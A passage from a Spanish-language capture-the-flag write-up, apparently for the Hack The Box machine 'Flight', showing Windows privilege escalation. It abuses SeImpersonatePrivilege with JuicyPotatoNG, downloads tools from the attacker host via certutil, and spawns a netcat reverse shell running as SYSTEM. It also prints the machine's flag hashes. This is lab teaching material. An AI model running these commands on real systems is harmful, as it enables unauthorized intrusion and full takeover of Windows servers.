</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Como el <strong>SeImpersonatePrivilege</strong> esta en enable podemos usar el <code class="language-plaintext highlighter-rouge">JuicyPotato</code> para escalar privilegios.</li>
</ul>

<p><a href="https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1">https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State   
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip JuicyPotatoNG.zip
Archive:  JuicyPotatoNG.zip
  inflating: JuicyPotatoNG.exe   
</code></pre></div></div>

<ul>
  <li>Vamos a subirlo a la maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\t</span>emp
certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.86/JuicyPotatoNG.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  000000  ...
  025800
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
PS C:<span class="se">\t</span>emp&gt; 
</code></pre></div></div>

<ul>
  <li>Ahora tambien necesitamos el <code class="language-plaintext highlighter-rouge">netcat</code> podemos usar el que trae <strong>Seclists</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Lo subimos ala maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.86/nc.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  0000  ...
  6e00
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
PS C:<span class="se">\t</span>emp&gt; 
</code></pre></div></div>

<ul>
  <li>Ahora nos pondremos en escucha para ganar accesos como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./JuicyPotatoNG.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\t</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">c.exe"</span> <span class="nt">-a</span> <span class="s1">'10.10.14.86 443 -e cmd'</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.86] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.187] 55848
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

<span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\&gt;</span>


</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop

09/22/2022  01:48 PM    &lt;DIR&gt;          <span class="nb">.</span>
09/22/2022  01:48 PM    &lt;DIR&gt;          ..
05/05/2023  05:38 AM                34 root.txt
               1 File<span class="o">(</span>s<span class="o">)</span>             34 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,735,803,392 bytes free

<span class="nb">type </span>root.txt
<span class="nb">type </span>root.txt
7331258631d8c7440a99b334890f914c

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<h2 id="usertxt">User.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> /r /s user.txt
 Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 1DF4-493D

 Directory of C:<span class="se">\D</span>ocuments and Settings<span class="se">\C</span>.Bum<span class="se">\D</span>esktop

05/05/2023  05:38 AM                34 user.txt
               1 File<span class="o">(</span>s<span class="o">)</span>             34 bytes

 Directory of C:<span class="se">\U</span>sers<span class="se">\C</span>.Bum<span class="se">\D</span>esktop

05/05/2023  05:38 AM                34 user.txt
               1 File<span class="o">(</span>s<span class="o">)</span>             34 bytes

     Total Files Listed:
               2 File<span class="o">(</span>s<span class="o">)</span>             68 bytes
               0 Dir<span class="o">(</span>s<span class="o">)</span>   4,735,803,392 bytes free

C:<span class="se">\&gt;</span>

<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\C</span>.Bum<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\C</span>.Bum<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
a39c9d5f10510d2133ed1b2ed5dda547

C:<span class="se">\&gt;</span>
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/hard/2024/04/06/flight.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitoregn7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
